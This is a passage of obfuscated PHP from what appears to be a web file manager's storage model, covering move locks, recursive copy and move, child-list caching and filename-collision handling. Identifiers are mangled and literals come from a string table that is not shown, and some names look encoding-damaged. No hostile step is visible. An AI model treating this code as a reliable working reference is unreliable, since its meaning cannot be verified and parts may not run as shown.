lockMoveStart($ÅÍıÓá½) { $Æºèùõ× =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Æºèùõ×[590], $ÅÍıÓá½); $Öàïšßã = 1; $this->_lockKey($Æºèùõ×[594] . $ÅÍıÓá½, $Öàïšßã); $this->_lockEvent($ÅÍıÓá½, array($Æºèùõ×[588], $Æºèùõ×[589]), $Öàïšßã); $this->_lockParent($ÅÍıÓá½, array($Æºèùõ×[588], $Æºèùõ×[590]), $Öàïšßã); $this->_lockEvent($ÅÍıÓá½, array($Æºèùõ×[595], $Æºèùõ×[591], $Æºèùõ×[592]), $Öàïšßã); $this->_lockCheckEnd($Æºèùõ×[590], $ÅÍıÓá½); } public function lockMoveEnd($˜¾ĞùÀø) { $ÂŠß¥Ã­ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $Ïô•åÑ = 0; $this->_lockKey($ÂŠß¥Ã­[594] . $˜¾ĞùÀø, $Ïô•åÑ); $this->_lockEvent($˜¾ĞùÀø, array($ÂŠß¥Ã­[588], $ÂŠß¥Ã­[589]), $Ïô•åÑ); $this->_lockParent($˜¾ĞùÀø, array($ÂŠß¥Ã­[588], $ÂŠß¥Ã­[590]), $Ïô•åÑ); $this->_lockEvent($˜¾ĞùÀø, array($ÂŠß¥Ã­[595], $ÂŠß¥Ã­[591], $ÂŠß¥Ã­[592]), $Ïô•åÑ); } private function _lockCheck($ƒö»ßÏâ, $ïŒİ™œ) { $Ø˜ã¿´ =& $_SERVER[ ÇƒŠìÀ]; $ığ¥‘Î€ = $this->sourceInfo($ïŒİ™œ); $¿Ò†€µ = $ƒö»ßÏâ . $Ø˜ã¿´[10] . $ïŒİ™œ; $this->_lockTimeStart[$¿Ò†€µ] = timeFloat(); if (!is_array($ığ¥‘Î€)) { return; } $÷¡È¾²¿ = LNG($Ø˜ã¿´[596]); CacheLock::setErrorMsg($Ø˜ã¿´[165] . htmlspecialchars($ığ¥‘Î€[$Ø˜ã¿´[32]]) . $Ø˜ã¿´[167] . $÷¡È¾²¿); $this->_lockKey($¿Ò†€µ, 1); $this->_lockKey($¿Ò†€µ, 0); $€ìœı¯Ã = array_reverse($this->parentLevelArray($ığ¥‘Î€[$Ø˜ã¿´[555]])); foreach ($€ìœı¯Ã as $ËÈÄàşÕ) { $¿Ò†€µ = $ƒö»ßÏâ . $Ø˜ã¿´[597] . $ËÈÄàşÕ; if (CacheLock::lockGet($Ø˜ã¿´[598] . $¿Ò†€µ)) { $ığ¥‘Î€ = $this->sourceInfo($ËÈÄàşÕ); CacheLock::setErrorMsg($Ø˜ã¿´[165] . htmlspecialchars($ığ¥‘Î€[$Ø˜ã¿´[32]]) . $Ø˜ã¿´[167] . $÷¡È¾²¿); $this->_lockKey($¿Ò†€µ, 1); $this->_lockKey($¿Ò†€µ, 0); } } } private function _lockCheckEnd($¾Š…™¢‰, $ã€âõµ) { $“õŠÈÑ =& $_SERVER[ ÇƒŠìÀ]; $İëÛİÒ» = $¾Š…™¢‰ . $“õŠÈÑ[10] . $ã€âõµ; CacheLock::setErrorMsg($“õŠÈÑ[424]); if (!isset($this->_lockTimeStart[$İëÛİÒ»])) { return; } $Ç¾ğá’ø = timeFloat() - $this->_lockTimeStart[$İëÛİÒ»]; unset($this->_lockTimeStart[$İëÛİÒ»]); if ($Ç¾ğá’ø > 0.5) { unset(self::$cacheSourceInfo[$“õŠÈÑ[503] . $ã€âõµ]); } $¯àºÆó‚ = $this->sourceInfo($ã€âõµ); if (!$¯àºÆó‚) { show_json(LNG($“õŠÈÑ[107]), !1); } } private function _lockParent($Ù¿ÀÓƒ‹, $Ö«¸ÌÁ³, $ÏË´©¤è) { if (!$this->autoLockSet) { return; } $‹ÀÂøœ = $this->sourceInfo($Ù¿ÀÓƒ‹); if (!is_array($‹ÀÂøœ)) { return; } $’ß¡Øù° = array_reverse($this->parentLevelArray($‹ÀÂøœ[$_SERVER[ ÇƒŠìÀ][555]])); foreach ($’ß¡Øù° as $¡àª„îŒ) { $this->_lockEvent($¡àª„îŒ, $Ö«¸ÌÁ³, $ÏË´©¤è); } } private function _lockEvent($®İ’¢œÇ, $ÚÂ–òÇ•, $å‡¡Øì”) { $«Èö¸»š =& $_SERVER[ ÇƒŠìÀ]; if (!$this->autoLockSet) { return; } foreach ($ÚÂ–òÇ• as $ÈáŞ–ş€) { $®àˆ»œÙ = $ÈáŞ–ş€ . $«Èö¸»š[10] . $®İ’¢œÇ; if ($å‡¡Øì” && CacheLock::lockGet($«Èö¸»š[598] . $®àˆ»œÙ)) { continue; } $this->_lockKey($®àˆ»œÙ, $å‡¡Øì”); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÎªØ„ªÏ, $Ù®Éµ‹Ÿ = 1) { $Ï‘Èƒ = $_SERVER[ ÇƒŠìÀ][598] . md5($ÎªØ„ªÏ); if ($Ù®Éµ‹Ÿ) { if (isset(self::$_lockItemArr[$Ï‘Èƒ])) { return; } self::$_lockItemArr[$Ï‘Èƒ] = 1; CacheLock::lock($Ï‘Èƒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ï‘Èƒ])) { return; } unset(self::$_lockItemArr[$Ï‘Èƒ]); CacheLock::unlock($Ï‘Èƒ); } } public function isParentOf($åìåÀ™ä, $†•‘ğš•) { $ÏŞäı =& $_SERVER[ ÇƒŠìÀ]; $î”Ùû² = $this->sourceInfo($åìåÀ™ä); $ì¨ƒ‹† = $this->sourceInfo($†•‘ğš•); $•ãûÕŞ = $î”Ùû²[$ÏŞäı[555]] . $î”Ùû²[$ÏŞäı[183]] . $ÏŞäı[50]; $Ÿš†Û´¶ = $ì¨ƒ‹†[$ÏŞäı[555]] . $ì¨ƒ‹†[$ÏŞäı[183]] . $ÏŞäı[50]; $ç†ºƒ¶± = strpos($Ÿš†Û´¶, $•ãûÕŞ) === 0; return $ç†ºƒ¶±; } private $targetIsDelete = 0; public function copy($°İŸÏŸ, $öÎÊ´°Ã, $ÈªÅì— = REPEAT_REPLACE, $á®şÕœû = '') { $Áôš¼¡ =& $_SERVER[ ÇƒŠìÀ]; $¥¼‹Áê“ = $this->sourceInfo($°İŸÏŸ); $¾İ…íŸØ = $this->sourceInfo($öÎÊ´°Ã); if (!$¥¼‹Áê“ || !$¾İ…íŸØ || $¾İ…íŸØ[$Áôš¼¡[455]] != $Áôš¼¡[90]) { return !1; } if ($this->isParentOf($°İŸÏŸ, $öÎÊ´°Ã)) { return !1; } $½Ã÷ø£Ç = $á®şÕœû ? $á®şÕœû : $¥¼‹Áê“[$Áôš¼¡[32]]; $this->lockCopyStart($°İŸÏŸ); $this->lockWriteStart($öÎÊ´°Ã, $½Ã÷ø£Ç); $’…ı½Ë¬ = array($Áôš¼¡[599] => array(), $Áôš¼¡[600] => array(), $Áôš¼¡[601] => array()); $this->targetIsDelete = intval($¥¼‹Áê“[$Áôš¼¡[475]]); $äÊú§Š = $this->fileNameExistAuto($öÎÊ´°Ã, $¥¼‹Áê“); $ôÈüÖÆ = $this->_copy($°İŸÏŸ, $öÎÊ´°Ã, $ÈªÅì—, $’…ı½Ë¬, !0, $á®şÕœû); $this->_childrenListClear(); $this->lockCopyEnd($°İŸÏŸ); $this->lockWriteEnd($öÎÊ´°Ã, $½Ã÷ø£Ç); if ($¥¼‹Áê“[$Áôš¼¡[455]] == $Áôš¼¡[90] && $äÊú§Š == $ôÈüÖÆ) { $this->folderSizeResetChildren($äÊú§Š); } Model($Áôš¼¡[602])->addAll($’…ı½Ë¬[$Áôš¼¡[600]], array(), !0); if ($äÊú§Š != $ôÈüÖÆ || $¥¼‹Áê“[$Áôš¼¡[455]] == $Áôš¼¡[90]) { Model($Áôš¼¡[603])->eventCopy($ôÈüÖÆ); } $this->saveAll($’…ı½Ë¬[$Áôš¼¡[601]]); Model($Áôš¼¡[216])->linkAdd($’…ı½Ë¬[$Áôš¼¡[599]]); $this->folderSizeReset($öÎÊ´°Ã); $this->updateModifyTime($öÎÊ´°Ã); return $ôÈüÖÆ; } private function _copy($¼ÏÆÛÖ, $İøä† Æ, $¶Ä¶, &$Í‡µ×Îƒ, $¨öøü”ù, $½±‹Ùˆæ = '') { $Î«§ÕµÖ =& $_SERVER[ ÇƒŠìÀ]; $™£ûÌ‡‡ = $this->sourceInfoCache($¼ÏÆÛÖ); $‡„§Š¡” = $™£ûÌ‡‡[$Î«§ÕµÖ[455]] == $Î«§ÕµÖ[90]; $¬¥ £æã = $½±‹Ùˆæ ? $½±‹Ùˆæ : $™£ûÌ‡‡[$Î«§ÕµÖ[32]]; $àá¿»¼Ç = $this->fileNameExistAuto($İøä† Æ, $™£ûÌ‡‡); if ($¨öøü”ù) { $this->_childrenAllMake($¼ÏÆÛÖ); if ($‡„§Š¡” && $àá¿»¼Ç) { $this->_childrenAllMake($àá¿»¼Ç); } } if (!$àá¿»¼Ç) { return $this->_copyCreate($¼ÏÆÛÖ, $İøä† Æ, $¬¥ £æã, $Í‡µ×Îƒ); } $ç‘Ÿ£¹ = $àá¿»¼Ç; if ($‡„§Š¡”) { if ($¶Ä¶ == REPEAT_RENAME_FOLDER) { $¬¥ £æã = $this->fileNameAutoCache($İøä† Æ, $¬¥ £æã, $¶Ä¶, $‡„§Š¡”); $ç‘Ÿ£¹ = $this->_copyCreate($¼ÏÆÛÖ, $İøä† Æ, $¬¥ £æã, $Í‡µ×Îƒ); } else { $„Æ­¬¾ô = $this->_childrenList($¼ÏÆÛÖ); foreach ($„Æ­¬¾ô as $úŸ‰ïı×) { $this->_copy($úŸ‰ïı×[$Î«§ÕµÖ[183]], $àá¿»¼Ç, $¶Ä¶, $Í‡µ×Îƒ, !1); } } } else { if ($¶Ä¶ == REPEAT_RENAME || $¶Ä¶ == REPEAT_RENAME_FOLDER) { $¬¥ £æã = $this->fileNameAutoCache($İøä† Æ, $¬¥ £æã, $¶Ä¶, $‡„§Š¡”); $ç‘Ÿ£¹ = $this->_copyCreate($¼ÏÆÛÖ, $İøä† Æ, $¬¥ £æã, $Í‡µ×Îƒ); } else { if ($¶Ä¶ == REPEAT_REPLACE) { $„ğü Ô÷ = $this->sourceInfoCache($àá¿»¼Ç); $ß±ÆÓ‘’ = $this->fileHistory($„ğü Ô÷, $™£ûÌ‡‡[$Î«§ÕµÖ[511]], $™£ûÌ‡‡[$Î«§ÕµÖ[78]]); if ($ß±ÆÓ‘’) { $Í‡µ×Îƒ[$Î«§ÕµÖ[599]][] = $™£ûÌ‡‡[$Î«§ÕµÖ[511]]; } } else { if ($¶Ä¶ == REPEAT_SKIP) { } } } Hook::trigger($Î«§ÕµÖ[604], array($Î«§ÕµÖ[605], $™£ûÌ‡‡, 0)); } return $ç‘Ÿ£¹; } private function _copyCreate($ÉÎÙÙÛŞ, $—‚š³ˆ, $²÷çÀë®, &$»ÚŒÈ×¿) { $•·¶¶¾ù =& $_SERVER[ ÇƒŠìÀ]; $™Ú»ûú€ = $this->sourceInfoCache($ÉÎÙÙÛŞ); $ ŸœÊŞ± = $this->sourceInfoCache($—‚š³ˆ); $Ú­Ö×¸à = $this->_makeItemData($™Ú»ûú€, $ ŸœÊŞ±, $²÷çÀë®); Hook::trigger($•·¶¶¾ù[606], $Ú­Ö×¸à); Hook::trigger($•·¶¶¾ù[607], array($•·¶¶¾ù[608], $Ú­Ö×¸à, 0)); $õ‰”¬È§ = $this->add($Ú­Ö×¸à); $±Ô‡ˆÃ = array($•·¶¶¾ù[183] => $õ‰”¬È§, $•·¶¶¾ù[32] => $²÷çÀë®); $this->_copyApplyMeta($±Ô‡ˆÃ, $»ÚŒÈ×¿); if ($™Ú»ûú€[$•·¶¶¾ù[455]] != $•·¶¶¾ù[90]) { $»ÚŒÈ×¿[$•·¶¶¾ù[599]][] = $™Ú»ûú€[$•·¶¶¾ù[511]]; return $õ‰”¬È§; } $øì‰àœ‘ = array(); $›†¶ÎÓ = array(); $this->_childrenListAll($ÉÎÙÙÛŞ, $øì‰àœ‘); $ÒÖê õ¹ = count($øì‰àœ‘); if ($ÒÖê õ¹ == 0) { return $õ‰”¬È§; } $•„Œ¡©Ø = $this->sourceInfo($õ‰”¬È§); foreach ($øì‰àœ‘ as $ÏÑ÷–¡) { $‚Õ¼¡˜è = $this->_makeItemData($ÏÑ÷–¡, $•„Œ¡©Ø, $ÏÑ÷–¡[$•·¶¶¾ù[32]]); $‚Õ¼¡˜è[$•·¶¶¾ù[555]] = $ÏÑ÷–¡[$•·¶¶¾ù[555]]; $›†¶ÎÓ[] = $‚Õ¼¡˜è; } $this->chunkEventSet($•·¶¶¾ù[609], array($•·¶¶¾ù[610], $Ú­Ö×¸à, $ÒÖê õ¹)); $this->addAll($›†¶ÎÓ, array(), !1); $šĞè‰³ = $this->where(array($•·¶¶¾ù[182] => $õ‰”¬È§))->select(); $”«åıÇ = $this->_childrenMakeRelation($øì‰àœ‘, $šĞè‰³); $”«åıÇ[$ÉÎÙÙÛŞ] = $õ‰”¬È§; $õÈÉ«“Á = array(); $£Æ®âÇ = array(); foreach ($šĞè‰³ as $ÏÑ÷–¡) { $èì¾•¡Í = $ÏÑ÷–¡[$•·¶¶¾ù[183]]; $éÀÛÍ¿« = $this->_childrenMatch($”«åıÇ, $ÏÑ÷–¡, $•„Œ¡©Ø); $õÈÉ«“Á[] = array($•·¶¶¾ù[183], $èì¾•¡Í, $•·¶¶¾ù[182], $éÀÛÍ¿«[$•·¶¶¾ù[182]]); $£Æ®âÇ[] = array($•·¶¶¾ù[183], $èì¾•¡Í, $•·¶¶¾ù[555], $éÀÛÍ¿«[$•·¶¶¾ù[555]]); $this->_copyApplyMeta($ÏÑ÷–¡, $»ÚŒÈ×¿); if ($ÏÑ÷–¡[$•·¶¶¾ù[455]] != $•·¶¶¾ù[90]) { $»ÚŒÈ×¿[$•·¶¶¾ù[599]][] = $ÏÑ÷–¡[$•·¶¶¾ù[511]]; } } $this->chunkEventSet($•·¶¶¾ù[611], array($•·¶¶¾ù[612], $Ú­Ö×¸à, $ÒÖê õ¹)); $this->saveAll($õÈÉ«“Á); $this->chunkEventSet($•·¶¶¾ù[613], array($•·¶¶¾ù[614], $Ú­Ö×¸à, $ÒÖê õ¹)); $this->saveAll($£Æ®âÇ); return $õ‰”¬È§; } private function _childrenMakeRelation($áşÌ”Ë¢, $å¿ï·Ì) { $Í±…ğ =& $_SERVER[ ÇƒŠìÀ]; $®ºúùÃÚ = array(); $Î¢îÄÜ¼ = array(); foreach ($áşÌ”Ë¢ as $¶Î¿À­œ) { $–ü‘¾öš = $¶Î¿À­œ[$Í±…ğ[32]] . $Í±…ğ[8] . $¶Î¿À­œ[$Í±…ğ[555]]; $®ºúùÃÚ[$–ü‘¾öš] = $¶Î¿À­œ[$Í±…ğ[183]]; } foreach ($å¿ï·Ì as $¶Î¿À­œ) { $–ü‘¾öš = $¶Î¿À­œ[$Í±…ğ[32]] . $Í±…ğ[8] . $¶Î¿À­œ[$Í±…ğ[555]]; $¨ÜÓ“ä× = $®ºúùÃÚ[$–ü‘¾öš]; $Î¢îÄÜ¼[$¨ÜÓ“ä×] = $¶Î¿À­œ[$Í±…ğ[183]]; } return $Î¢îÄÜ¼; } private function _childrenMatch($ë·Ñ¿İ‹, $£ŒùÛ˜è, $ôï‘³æ¸) { $¹²®§é =& $_SERVER[ ÇƒŠìÀ]; $˜¾èÁö¯ = $ôï‘³æ¸[$¹²®§é[555]]; $«øÄÊşÃ = $this->parentLevelArray($£ŒùÛ˜è[$¹²®§é[555]]); foreach ($«øÄÊşÃ as $›Ş€ŠøÖ) { if (isset($ë·Ñ¿İ‹[$›Ş€ŠøÖ])) { $˜¾èÁö¯ .= $ë·Ñ¿İ‹[$›Ş€ŠøÖ] . $¹²®§é[615]; } } $˜¾èÁö¯ = rtrim($˜¾èÁö¯, $¹²®§é[50]) . $¹²®§é[50]; $½€É¦Öç = $this->parentLevelArray($˜¾èÁö¯); $Á·œïôˆ = $½€É¦Öç[count($½€É¦Öç) - 1]; return array($¹²®§é[182] => $Á·œïôˆ, $¹²®§é[555] => $˜¾èÁö¯); } private function _makeItemData($ÖßáÚóŸ, $¯·æ­ù¶, $Ÿ¡É«†Œ) { $æÓĞÕ³ª =& $_SERVER[ ÇƒŠìÀ]; $ŒÍİÔ‹Å = array($æÓĞÕ³ª[616] => $ÖßáÚóŸ[$æÓĞÕ³ª[455]], $æÓĞÕ³ª[464] => $Ÿ¡É«†Œ, $æÓĞÕ³ª[617] => $ÖßáÚóŸ[$æÓĞÕ³ª[456]] ? $ÖßáÚóŸ[$æÓĞÕ³ª[456]] : $æÓĞÕ³ª[12], $æÓĞÕ³ª[512] => $ÖßáÚóŸ[$æÓĞÕ³ª[511]] ? $ÖßáÚóŸ[$æÓĞÕ³ª[511]] : 0, $æÓĞÕ³ª[587] => $ÖßáÚóŸ[$æÓĞÕ³ª[78]] ? $ÖßáÚóŸ[$æÓĞÕ³ª[78]] : 0, $æÓĞÕ³ª[618] => intval($¯·æ­ù¶[$æÓĞÕ³ª[180]]), $æÓĞÕ³ª[619] => intval($¯·æ­ù¶[$æÓĞÕ³ª[540]]), $æÓĞÕ³ª[620] => intval(USER_ID), $æÓĞÕ³ª[621] => intval(USER_ID), $æÓĞÕ³ª[447] => intval($¯·æ­ù¶[$æÓĞÕ³ª[183]]), $æÓĞÕ³ª[622] => $¯·æ­ù¶[$æÓĞÕ³ª[555]] . $¯·æ­ù¶[$æÓĞÕ³ª[183]] . $æÓĞÕ³ª[50], $æÓĞÕ³ª[468] => $ÖßáÚóŸ[$æÓĞÕ³ª[87]] ? $ÖßáÚóŸ[$æÓĞÕ³ª[87]] : time(), $æÓĞÕ³ª[474] => 0, $æÓĞÕ³ª[623] => $æÓĞÕ³ª[12]); return $ŒÍİÔ‹Å; } private function _copyApplyMeta($ÄÜ‡·Ö, &$‰»Ó‘ÉĞ) { $Ù’şÕ´ =& $_SERVER[ ÇƒŠìÀ]; $•¨Ìï¤ = $ÄÜ‡·Ö[$Ù’şÕ´[183]]; $•ı”çºï = $ÄÜ‡·Ö[$Ù’şÕ´[32]]; if (!isset($ÄÜ‡·Ö[$Ù’şÕ´[624]]) || !$ÄÜ‡·Ö[$Ù’şÕ´[624]] || $ÄÜ‡·Ö[$Ù’şÕ´[624]] == $Ù’şÕ´[214]) { $‰»Ó‘ÉĞ[$Ù’şÕ´[601]][] = array($Ù’şÕ´[183], $•¨Ìï¤, $Ù’şÕ´[624], short_id($•¨Ìï¤)); } if (Input::check($•ı”çºï, $Ù’şÕ´[625])) { $‰»Ó‘ÉĞ[$Ù’şÕ´[600]][] = array($Ù’şÕ´[183] => $•¨Ìï¤, $Ù’şÕ´[96] => $Ù’şÕ´[508], $Ù’şÕ´[420] => str_replace($Ù’şÕ´[53], $Ù’şÕ´[12], Pinyin::get($•ı”çºï))); $‰»Ó‘ÉĞ[$Ù’şÕ´[600]][] = array($Ù’şÕ´[183] => $•¨Ìï¤, $Ù’şÕ´[96] => $Ù’şÕ´[507], $Ù’şÕ´[420] => Pinyin::get($•ı”çºï, $Ù’şÕ´[626])); } $‰»Ó‘ÉĞ[$Ù’şÕ´[600]][] = array($Ù’şÕ´[183] => $•¨Ìï¤, $Ù’şÕ´[96] => $Ù’şÕ´[487], $Ù’şÕ´[420] => KodSort::makeStr($•ı”çºï)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ì¦„º•‘) { $áô€Æ‚ =& $_SERVER[ ÇƒŠìÀ]; $êñËÚ = $this->sourceInfo($Ì¦„º•‘); $Ö¬Îòå = $áô€Æ‚[627]; $ñ·³¸Ğİ = array($áô€Æ‚[555] => array($áô€Æ‚[582], $êñËÚ[$áô€Æ‚[555]] . $Ì¦„º•‘ . $áô€Æ‚[583]), $áô€Æ‚[475] => $this->targetIsDelete); $ À°Û = $this->field($Ö¬Îòå)->where($ñ·³¸Ğİ)->select(); if (!$ À°Û) { return; } $ À°Û = array_to_keyvalue($ À°Û, $áô€Æ‚[183]); foreach ($ À°Û as $”©Ü«ÂÔ) { $£ĞÔ•ßİ = $”©Ü«ÂÔ[$áô€Æ‚[182]]; $Ì¦„º•‘ = $”©Ü«ÂÔ[$áô€Æ‚[183]]; if (!isset($this->_childrenListCache[$Ì¦„º•‘]) && $”©Ü«ÂÔ[$áô€Æ‚[455]] == $áô€Æ‚[90]) { $this->_childrenListCache[$Ì¦„º•‘] = array(); } if (!isset($this->_childrenListCache[$£ĞÔ•ßİ])) { $this->_childrenListCache[$£ĞÔ•ßİ] = array(); } $this->_childrenListCache[$£ĞÔ•ßİ][$Ì¦„º•‘] = $”©Ü«ÂÔ; $this->_childrenItemCache[$Ì¦„º•‘] = $”©Ü«ÂÔ; } } private function _childrenListAll($Ï¥¡ª¢, &$ªú­åæ«) { $¾Ö™ù²è =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->_childrenListCache[$Ï¥¡ª¢])) { return; } $ÀÅãôˆ’ = $this->_childrenListCache[$Ï¥¡ª¢]; foreach ($ÀÅãôˆ’ as $¾†¡ÂÏ¤ => $‡ØÃÄ¶Ø) { $ªú­åæ«[$¾†¡ÂÏ¤] = $‡ØÃÄ¶Ø; if ($‡ØÃÄ¶Ø[$¾Ö™ù²è[455]] == $¾Ö™ù²è[90]) { $this->_childrenListAll($¾†¡ÂÏ¤, $ªú­åæ«); } } } private function sourceInfoCache($Ÿæ°ã»®) { if (isset($this->_childrenItemCache[$Ÿæ°ã»®])) { return $this->_childrenItemCache[$Ÿæ°ã»®]; } return $this->sourceInfo($Ÿæ°ã»®); } private function _childrenList($’˜­ú Ù) { if (isset($this->_childrenListCache[$’˜­ú Ù])) { return $this->_childrenListCache[$’˜­ú Ù]; } return $this->_childrenListSelect($’˜­ú Ù); } private function _childrenListSelect($â¢Êõå ) { $ø¾¶«…· =& $_SERVER[ ÇƒŠìÀ]; $¶øö•¤– = array($ø¾¶«…·[182] => $â¢Êõå , $ø¾¶«…·[475] => $this->targetIsDelete); $Û½ÚøêÌ = $this->where($¶øö•¤–)->select(); $Û½ÚøêÌ = $Û½ÚøêÌ ? $Û½ÚøêÌ : array(); $şğ¹©ä = array_to_keyvalue($Û½ÚøêÌ, $ø¾¶«…·[183]); $this->_childrenListCache[$â¢Êõå ] = $şğ¹©ä; foreach ($şğ¹©ä as $â¢Êõå  => $¡ÈÁ¸±“) { $this->_childrenItemCache[$â¢Êõå ] = $¡ÈÁ¸±“; } return $şğ¹©ä; } private function fileNameExistAuto($Ú»Ûõ Ñ, $ŒìûÒö‹) { $á¹İ„êØ =& $_SERVER[ ÇƒŠìÀ]; if ($ŒìûÒö‹[$á¹İ„êØ[475]] == $á¹İ„êØ[90]) { return $this->fileNameExist($Ú»Ûõ Ñ, $ŒìûÒö‹[$á¹İ„êØ[32]]); } return $this->fileNameExistCache($Ú»Ûõ Ñ, $ŒìûÒö‹[$á¹İ„êØ[32]]); } private function fileNameExistCache($àÊÁé·‡, $¼£Ïè ) { $ïŒøº„ =& $_SERVER[ ÇƒŠìÀ]; $¼£Ïè  = strtolower($¼£Ïè ); $…·ç ƒ· = $this->_childrenList($àÊÁé·‡); foreach ($…·ç ƒ· as $Şé§¿÷÷) { if ($¼£Ïè  == strtolower($Şé§¿÷÷[$ïŒøº„[32]])) { return $Şé§¿÷÷[$ïŒøº„[183]]; } } return !1; } private function fileNameAutoCache($ã ÜÂˆ, $ô¶¿İÃõ, $İáª“øÉ, $Î²îÎå) { $é×à¤Î =& $_SERVER[ ÇƒŠìÀ]; $»‹Âû¹“ = $this->_childrenList($ã ÜÂˆ); $·Öˆ×±© = array_to_keyvalue($»‹Âû¹“, $é×à¤Î[12], $é×à¤Î[32]); return $this->fileNameAutoGet($·Öˆ×±©, $ô¶¿İÃõ, $İáª“øÉ, $Î²îÎå); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($æïøÙÚÊ, $¼¸ä×Ãå, $°£©ªàÜ = REPEAT_REPLACE, $€óªöµÎ = '') { $¢šÕÕë =& $_SERVER[ ÇƒŠìÀ]; $×ü—¤Ş÷ = $this->sourceInfo($æïøÙÚÊ); $´äº¨îª = $this->sourceInfo($¼¸ä×Ãå); if ($×ü—¤Ş÷[$¢šÕÕë[182]] == $´äº¨îª[$¢šÕÕë[183]]) { if ($×ü—¤Ş÷[$¢šÕÕë[475]] == $¢šÕÕë[90]) { Model($¢šÕÕë[473])->restore(array($æïøÙÚÊ)); } if (!$€óªöµÎ || $€óªöµÎ == $×ü—¤Ş÷[$¢šÕÕë[32]]) { return $æïøÙÚÊ; } } $Æõ‘‘øÛ = $this->pathInfoMore($æïøÙÚÊ); if ($this->isParentOf($æïøÙÚÊ, $¼¸ä×Ãå)) { return !1; } if (!$×ü—¤Ş÷ || !$´äº¨îª || $´äº¨îª[$¢šÕÕë[455]] != $¢šÕÕë[90]) { return !1; } Hook::trigger($¢šÕÕë[628], $Æõ‘‘øÛ); $this->targetIsDelete = intval($×ü—¤Ş÷[$¢šÕÕë[475]]); if ($×ü—¤Ş÷[$¢šÕÕë[182]] == $¼¸ä×Ãå && $€óªöµÎ != $×ü—¤Ş÷[$¢šÕÕë[32]]) { $Èä’Ù–­ = $this->fileNameExist($¼¸ä×Ãå, $€óªöµÎ); if ($Èä’Ù–­ && $×ü—¤Ş÷[$¢šÕÕë[455]] == $¢šÕÕë[214]) { $¬ñà¶©Ã = $this->sourceInfo($Èä’Ù–­); $“ÄÓÅ£ = $this->fileHistory($¬ñà¶©Ã, $×ü—¤Ş÷[$¢šÕÕë[511]], $×ü—¤Ş÷[$¢šÕÕë[78]]); if (!$“ÄÓÅ£) { Model($¢šÕÕë[514])->remove($×ü—¤Ş÷[$¢šÕÕë[511]]); } $this->removeNow($æïøÙÚÊ, !1); $this->folderSizeReset($¼¸ä×Ãå); Hook::trigger($¢šÕÕë[629], $Æõ‘‘øÛ); return $Èä’Ù–­; } } $ñ—¿øšƒ = $€óªöµÎ ? $€óªöµÎ : $×ü—¤Ş÷[$¢šÕÕë[32]]; $this->lockMoveStart($æïøÙÚÊ); $this->lockWriteStart($¼¸ä×Ãå, $ñ—¿øšƒ); $—æ¸·ù = array($¢šÕÕë[599] => array(), $¢šÕÕë[630] => !1); $this->clearShare($æïøÙÚÊ, $¼¸ä×Ãå); $şñ¾á“ = $this->fileNameExistAuto($¼¸ä×Ãå, $×ü—¤Ş÷); $Õª¾Ù—‚ = $this->_move($æïøÙÚÊ, $¼¸ä×Ãå, $°£©ªàÜ, $—æ¸·ù, $€óªöµÎ); $this->sourceCacheClear(); if ($×ü—¤Ş÷[$¢šÕÕë[455]] == $¢šÕÕë[90] && $şñ¾á“) { $this->folderSizeResetChildren($Õª¾Ù—‚); } Model($¢šÕÕë[216])->linkAdd($—æ¸·ù[$¢šÕÕë[599]]); if ($şñ¾á“ && $—æ¸·ù[$¢šÕÕë[630]]) { $this->removeNow($æïøÙÚÊ, !1); } $this->lockMoveEnd($æïøÙÚÊ); $this->lockWriteEnd($¼¸ä×Ãå, $ñ—¿øšƒ); $this->folderSizeReset($×ü—¤Ş÷[$¢šÕÕë[182]]); $this->folderSizeReset($¼¸ä×Ãå); $ğÏªíÏŞ = array($×ü—¤Ş÷[$¢šÕÕë[182]], $¼¸ä×Ãå); if ($×ü—¤Ş÷[$¢šÕÕë[455]] == $¢šÕÕë[90]) { $ğÏªíÏŞ[] = $æïøÙÚÊ; } $this->updateModifyTime($ğÏªíÏŞ); Model($¢šÕÕë[603])->eventMove($æïøÙÚÊ, $×ü—¤Ş÷[$¢šÕÕë[182]], $¼¸ä×Ãå); Hook::trigger($¢šÕÕë[629], $Æõ‘‘øÛ); return $Õª¾Ù—‚; } private function _move($˜¶—–, $çòŠĞşÍ, $ÆÏ üîÙ, &$ÜåÆÉ»Û, $ú”Ôˆû° = '') { $³×Æˆá™ =& $_SERVER[ ÇƒŠìÀ]; $ˆÜŒÊŸ¯ = $this->sourceInfo($˜¶—–); $èİşíÇ÷ = $ˆÜŒÊŸ¯[$³×Æˆá™[455]] == $³×Æˆá™[90]; $ïÁğÉı = $ú”Ôˆû° ? $ú”Ôˆû° : $ˆÜŒÊŸ¯[$³×Æˆá™[32]]; $üÚ˜ì©ı = $this->fileNameExistAuto($çòŠĞşÍ, $ˆÜŒÊŸ¯); $this->lockMoveStart($˜¶—–); $this->lockWriteStart($çòŠĞşÍ, $ïÁğÉı); if (!$üÚ˜ì©ı) { return $this->_moveForce($˜¶—–, $çòŠĞşÍ, $ïÁğÉı); } $ö‹ò´«Ø = $üÚ˜ì©ı; $Ù±Úñ‹» = !1; if ($èİşíÇ÷) { if ($ÆÏ üîÙ == REPEAT_RENAME_FOLDER) { $ïÁğÉı = $this->fileNameAuto($çòŠĞşÍ, $ïÁğÉı, $ÆÏ üîÙ, $èİşíÇ÷); $ö‹ò´«Ø = $this->_moveForce($˜¶—–, $çòŠĞşÍ, $ïÁğÉı); } else { if ($ÆÏ üîÙ == REPEAT_RENAME_FOLDER) { $ÆÏ üîÙ = REPEAT_RENAME; } $±«§ºÌï = $this->_childrenListSelect($˜¶—–); foreach ($±«§ºÌï as $Ã¡¢ŸÜğ) { $this->_move($Ã¡¢ŸÜğ[$³×Æˆá™[183]], $üÚ˜ì©ı, $ÆÏ üîÙ, $ÜåÆÉ»Û); } $Ù±Úñ‹» = !0; } } else { if ($ÆÏ üîÙ == REPEAT_SKIP) { $Ù±Úñ‹» = !0; } else { if ($ÆÏ üîÙ == REPEAT_RENAME || $ÆÏ üîÙ == REPEAT_RENAME_FOLDER) { $ïÁğÉı = $this->fileNameAuto($çòŠĞşÍ, 